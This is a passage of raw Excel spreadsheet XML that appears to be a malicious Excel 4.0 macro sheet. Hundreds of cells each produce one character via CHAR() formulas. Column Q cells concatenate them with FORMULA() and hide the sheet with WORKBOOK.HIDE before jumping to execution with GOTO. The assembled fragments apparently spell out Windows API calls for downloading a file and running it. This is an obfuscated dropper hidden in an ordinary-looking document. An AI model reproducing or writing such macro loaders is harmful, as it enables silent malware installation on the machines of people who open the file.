        <f>FORMULA(N7&amp;N8&amp;N10&amp;N11&amp;N13&amp;N14&amp;N15&amp;N16&amp;N17&amp;N18&amp;N19&amp;N21&amp;N22&amp;N24&amp;N25&amp;N26&amp;N27&amp;N28&amp;N30&amp;N31&amp;N32&amp;N33&amp;N34&amp;N36&amp;N37&amp;N38&amp;N40&amp;N41&amp;N42&amp;N43&amp;N45&amp;N46&amp;N47&amp;N49&amp;N50&amp;N51&amp;N52&amp;N54&amp;N55&amp;N56&amp;N57&amp;N59&amp;N60&amp;N61&amp;N63&amp;N64&amp;N65&amp;N66&amp;N68&amp;N69&amp;N70&amp;N71&amp;N73&amp;N74&amp;N75&amp;N76&amp;N78&amp;N79&amp;N80&amp;N81&amp;N82&amp;N83&amp;N85&amp;N86&amp;N87&amp;N88&amp;N89&amp;N90&amp;N92&amp;N93&amp;N94&amp;N95&amp;N96&amp;N97&amp;N99&amp;N100&amp;N101&amp;N102&amp;N103&amp;N104&amp;N106&amp;N107&amp;N108&amp;N109&amp;N110&amp;N112&amp;N113&amp;N114&amp;N115&amp;N116&amp;N118&amp;N119&amp;N120&amp;N121,R18)</f>
        <v>1</v>
      </c>
    </row>
    <row r="19" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A19" t="str">
        <f>CHAR(71)</f>
        <v>G</v>
      </c>
      <c r="B19" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="C19" s="1"/>
      <c r="D19" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="E19" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="F19" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="G19" t="str">
        <f>CHAR(93)</f>
        <v>]</v>
      </c>
      <c r="I19" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="J19" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="K19" s="1"/>
      <c r="L19" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M19" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="N19" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O19" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="Q19" t="b">
        <f>FORMULA(O1&amp;O2&amp;O4&amp;O5&amp;O7&amp;O8&amp;O9&amp;O10&amp;O11&amp;O12&amp;O13&amp;O15&amp;O16&amp;O18&amp;O19&amp;O20&amp;O21&amp;O22&amp;O24&amp;O25&amp;O26&amp;O27&amp;O28&amp;O30&amp;O31&amp;O32&amp;O34&amp;O35&amp;O36&amp;O37&amp;O39&amp;O40&amp;O41&amp;O43&amp;O44&amp;O45&amp;O46&amp;O48&amp;O49&amp;O50&amp;O51&amp;O53&amp;O54&amp;O55&amp;O57&amp;O58&amp;O59&amp;O60&amp;O62&amp;O63&amp;O64&amp;O65&amp;O67&amp;O68&amp;O69&amp;O70&amp;O72&amp;O73&amp;O74&amp;O75&amp;O76&amp;O77&amp;O79&amp;O80&amp;O81&amp;O82&amp;O83&amp;O84&amp;O86&amp;O87&amp;O88&amp;O89&amp;O90&amp;O91&amp;O93&amp;O94&amp;O95&amp;O96&amp;O97&amp;O98&amp;O100&amp;O101&amp;O102&amp;O103&amp;O104&amp;O106&amp;O107&amp;O108&amp;O109&amp;O110&amp;O112&amp;O113&amp;O114&amp;O115&amp;O117&amp;O118&amp;O119&amp;O120&amp;O121&amp;O122&amp;O124&amp;O125&amp;O127&amp;O128&amp;O129&amp;O130&amp;O132&amp;O133&amp;O134&amp;O135&amp;O136&amp;O138&amp;O139&amp;O140&amp;O141&amp;O142&amp;O143&amp;O145&amp;O146&amp;O147&amp;O148&amp;O149&amp;O151&amp;O152&amp;O153&amp;O154&amp;O156&amp;O157&amp;O158&amp;O159&amp;O160&amp;O162&amp;O163&amp;O164&amp;O165&amp;O166&amp;O167&amp;O168&amp;O169,R19)</f>
        <v>1</v>
      </c>
    </row>
    <row r="20" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A20" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="B20" t="s">
        <v>3</v>
      </c>
      <c r="C20" s="1"/>
      <c r="D20" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="E20" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="F20" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="G20" t="s">
        <v>3</v>
      </c>
      <c r="J20" t="s">
        <v>3</v>
      </c>
      <c r="K20" s="1"/>
      <c r="L20" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M20" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="N20" t="s">
        <v>3</v>
      </c>
      <c r="O20" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="Q20" t="b">
        <f>FORMULA(P21&amp;P22&amp;P24&amp;P25&amp;P27&amp;P28&amp;P29&amp;P30&amp;P31&amp;P32&amp;P33&amp;P35&amp;P36,R20)</f>
        <v>1</v>
      </c>
    </row>
    <row r="21" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A21" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="B21" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="C21" s="1"/>
      <c r="D21" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="E21" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="F21" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="G21" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="J21" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="K21" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="L21" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M21" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="N21" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O21" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="P21" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="Q21" t="b">
        <f>WORKBOOK.HIDE("1294mTTcvy",TRUE)</f>
        <v>1</v>
      </c>
    </row>
    <row r="22" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A22" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="B22" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="C22" s="1"/>
      <c r="D22" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="E22" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="F22" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="G22" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="J22" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="K22" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="L22" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="M22" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="N22" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="O22" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="P22" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="Q22" t="b">
        <f>GOTO(R1)</f>
        <v>1</v>
      </c>
    </row>
    <row r="23" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A23" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="B23" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="C23" s="1"/>
      <c r="D23" t="s">
        <v>3</v>
      </c>
      <c r="E23" t="s">
        <v>3</v>
      </c>
      <c r="F23" t="s">
        <v>3</v>
      </c>
      <c r="G23" t="s">
        <v>3</v>
      </c>
      <c r="I23" t="s">
        <v>3</v>
      </c>
      <c r="J23" t="str">
        <f>CHAR(68)</f>
        <v>D</v>
      </c>
      <c r="K23" t="s">
        <v>3</v>
      </c>
      <c r="L23" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="M23" t="s">
        <v>3</v>
      </c>
      <c r="N23" t="s">
        <v>3</v>
      </c>
      <c r="O23" t="s">
        <v>3</v>
      </c>
      <c r="P23" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="24" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A24" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="B24" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D24" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="E24" t="str">
        <f>CHAR(43)</f>
        <v>+</v>
      </c>
      <c r="F24" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="G24" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="J24" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="K24" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="L24" t="s">
        <v>3</v>
      </c>
      <c r="M24" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N24" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O24" s="1" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="P24" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
    </row>
    <row r="25" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A25" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="B25" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="D25" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="E25" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="F25" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="G25" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="J25" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="K25" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="L25" s="1" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="M25" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="N25" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O25" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="P25" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
    </row>
    <row r="26" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A26" t="s">
        <v>3</v>
      </c>
      <c r="B26" t="s">
        <v>3</v>
      </c>
      <c r="D26" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="E26" t="s">
        <v>3</v>
      </c>
      <c r="F26" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="G26" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="J26" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="K26" t="s">
        <v>3</v>
      </c>
      <c r="L26" s="1" t="str">
        <f>CHAR(68)</f>
        <v>D</v>
      </c>
      <c r="M26" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="N26" t="str">
        <f>CHAR(107)</f>
        <v>k</v>
      </c>
      <c r="O26" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="P26" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="27" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A27" t="str">
        <f>CHAR(75)</f>
        <v>K</v>
      </c>
      <c r="B27" s="1" t="str">
        <f>CHAR(52)</f>
        <v>4</v>
      </c>
      <c r="D27" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="E27" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="F27" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="G27" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
      <c r="J27" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="K27" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="L27" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="M27" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="N27" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="O27" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="P27" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
    </row>
    <row r="28" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A28" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="B28" s="1" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="C28" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="D28" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="E28" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="F28" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="G28" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="J28" t="s">
        <v>3</v>
      </c>
      <c r="K28" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="L28" s="1" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="M28" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
      <c r="N28" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O28" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="P28" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
    </row>
    <row r="29" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A29" t="s">
        <v>3</v>
      </c>
      <c r="B29" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="C29" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="D29" t="s">
        <v>3</v>
      </c>
      <c r="E29" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="F29" t="s">
        <v>3</v>
      </c>
      <c r="G29" t="s">
        <v>3</v>
      </c>
      <c r="J29" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="K29" t="str">
        <f>CHAR(78)</f>
        <v>N</v>
      </c>
      <c r="L29" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="M29" t="s">
        <v>3</v>
      </c>
      <c r="N29" t="s">
        <v>3</v>
      </c>
      <c r="O29" t="s">
        <v>3</v>
      </c>
      <c r="P29" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
    </row>
    <row r="30" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A30" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="B30" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="C30" t="s">
        <v>3</v>
      </c>
      <c r="D30" t="str">
        <f>CHAR(120)</f>
        <v>x</v>
      </c>
      <c r="E30" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="F30" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="J30" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="K30" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="L30" t="s">
        <v>3</v>
      </c>
      <c r="M30" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N30" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O30" s="1" t="str">
        <f>CHAR(120)</f>
        <v>x</v>
      </c>
      <c r="P30" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
    </row>
    <row r="31" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A31" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="B31" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="C31" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="D31" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="E31" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="F31" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="J31" t="s">
        <v>3</v>
      </c>
      <c r="K31" t="str">
        <f>CHAR(77)</f>
        <v>M</v>
      </c>
      <c r="L31" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="M31" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="N31" s="1" t="str">
        <f>CHAR(107)</f>
        <v>k</v>
      </c>
      <c r="O31" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="P31" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
    </row>
    <row r="32" spans="1:17" x14ac:dyDescent="0.25">
      <c r="A32" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="B32" t="s">
        <v>3</v>
      </c>
      <c r="C32" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="D32" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="E32" t="s">
        <v>3</v>
      </c>
      <c r="F32" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="J32" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="K32" t="str">
        <f>CHAR(66)</f>
        <v>B</v>
      </c>
      <c r="L32" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="M32" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N32" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O32" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="P32" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
    </row>
    <row r="33" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A33" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="B33" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="C33" t="s">
        <v>3</v>
      </c>
      <c r="D33" t="s">
        <v>3</v>
      </c>
      <c r="E33" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="F33" t="s">
        <v>3</v>
      </c>
      <c r="H33" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="J33" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="K33" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="L33" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="M33" t="s">
        <v>3</v>
      </c>
      <c r="N33" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="O33" t="s">
        <v>3</v>
      </c>
      <c r="P33" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
    </row>
    <row r="34" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A34" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="B34" s="1" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="C34" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="D34" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="E34" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="F34" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="H34" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="J34" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="K34" t="s">
        <v>3</v>
      </c>
      <c r="L34" t="s">
        <v>3</v>
      </c>
      <c r="M34" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="N34" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="O34" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="P34" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="35" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A35" t="s">
        <v>3</v>
      </c>
      <c r="B35" s="1" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="C35" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="D35" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="E35" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
      <c r="F35" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="H35" t="s">
        <v>3</v>
      </c>
      <c r="J35" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="K35" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="L35" s="1" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="M35" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N35" t="s">
        <v>3</v>
      </c>
      <c r="O35" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="P35" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
    </row>
    <row r="36" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A36" s="1" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="B36" t="s">
        <v>3</v>
      </c>
      <c r="C36" t="str">
        <f>CHAR(78)</f>
        <v>N</v>
      </c>
      <c r="D36" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="E36" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="F36" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="H36" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="J36" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="K36" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="L36" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="M36" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="N36" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="O36" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="P36" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
    </row>
    <row r="37" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A37" s="1" t="str">
        <f>CHAR(57)</f>
        <v>9</v>
      </c>
      <c r="B37" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="C37" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="D37" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="E37" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="F37" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="H37" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="J37" t="s">
        <v>3</v>
      </c>
      <c r="K37" t="s">
        <v>3</v>
      </c>
      <c r="L37" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="M37" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="N37" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="O37" s="1" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
    </row>
    <row r="38" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A38" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="B38" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="C38" t="str">
        <f>CHAR(77)</f>
        <v>M</v>
      </c>
      <c r="D38" t="s">
        <v>3</v>
      </c>
      <c r="F38" t="s">
        <v>3</v>
      </c>
      <c r="H38" t="s">
        <v>3</v>
      </c>
      <c r="J38" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="K38" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="L38" s="1" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="M38" t="s">
        <v>3</v>
      </c>
      <c r="N38" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O38" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="39" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A39" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="B39" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="C39" t="str">
        <f>CHAR(66)</f>
        <v>B</v>
      </c>
      <c r="D39" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="F39" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="H39" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="J39" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="K39" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="L39" t="s">
        <v>3</v>
      </c>
      <c r="M39" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="N39" t="s">
        <v>3</v>
      </c>
      <c r="O39" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="40" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A40" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="B40" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="C40" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D40" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="H40" t="str">
        <f>CHAR(68)</f>
        <v>D</v>
      </c>
      <c r="J40" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="K40" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="L40" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="M40" t="str">
        <f>CHAR(68)</f>
        <v>D</v>
      </c>
      <c r="N40" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="O40" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="41" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A41" t="s">
        <v>3</v>
      </c>
      <c r="B41" t="s">
        <v>3</v>
      </c>
      <c r="C41" t="s">
        <v>3</v>
      </c>
      <c r="D41" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="H41" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="J41" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="K41" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="L41" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="M41" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N41" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O41" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="42" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A42" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="B42" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="C42" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="D42" t="s">
        <v>3</v>
      </c>
      <c r="H42" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="J42" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="K42" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="L42" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="M42" t="s">
        <v>3</v>
      </c>
      <c r="N42" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
